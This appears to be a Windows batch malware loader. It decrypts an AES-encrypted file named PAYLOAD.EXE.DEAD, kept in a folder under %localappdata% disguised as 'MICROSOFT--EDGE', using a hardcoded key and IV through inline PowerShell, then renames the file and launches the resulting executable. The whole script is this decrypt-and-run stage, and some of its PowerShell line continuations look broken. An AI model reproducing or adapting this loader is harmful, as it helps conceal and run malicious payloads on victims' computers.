@echo off
setlocal EnableDelayedExpansion

set "filePath=%localappdata%\MICROSOFT--EDGE\PAYLOAD.EXE.DEAD"

if not exist "%filePath%" (
    echo File does not exist: %filePath%
    exit /b
)

if /i not "%filePath:~-5%"==".dead" (
    echo The file does not have a .dead extension: %filePath%
    exit /b
)

echo Decrypting file %filePath%...
call :EncryptDecryptFile "%filePath%"
echo Decrypted: %filePath%

set "newFilePath=%filePath:.dead=%"
echo Original file path: %filePath%
echo New file path: %newFilePath%

for %%F in ("%filePath%") do (
    set "dir=%%~dpF"
    set "filename=%%~nF"
    set "extension=%%~xF"
)

ren "%filePath%" "%filename%%extension:~0,-5%"
timeout /t 2

echo File decrypted and renamed to: %newFilePath%

color 07
start "" "%localappdata%\MICROSOFT--EDGE\PAYLOAD.EXE"
exit /b

:EncryptDecryptFile
set "inputFile=%~1"

powershell -NoProfile -Command ^
    "$key = [System.Text.Encoding]::UTF8.GetBytes('strong_secret_key_here_256bits');" ^   # 256 bit key
    "$key = $key[0..31]"  ^  # Ensure key is 256 bits (32 bytes)
    "$iv = [System.Text.Encoding]::UTF8.GetBytes('1234567890123456');"  ^  # 16 bytes for IV
    "$content = [System.IO.File]::ReadAllBytes(\"%inputFile%\");" ^
    "$aesAlg = New-Object System.Security.Cryptography.AesManaged;" ^
    "$aesAlg.Key = $key;" ^
    "$aesAlg.IV = $iv;" ^
    "$aesAlg.Mode = [System.Security.Cryptography.CipherMode]::CBC;" ^
    "$aesAlg.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7;" ^
    "$transform = $aesAlg.CreateDecryptor();" ^
    "$decrypted = $transform.TransformFinalBlock($content, 0, $content.Length);" ^
    "[System.IO.File]::WriteAllBytes(\"%inputFile%\", $decrypted);"

Exit /b
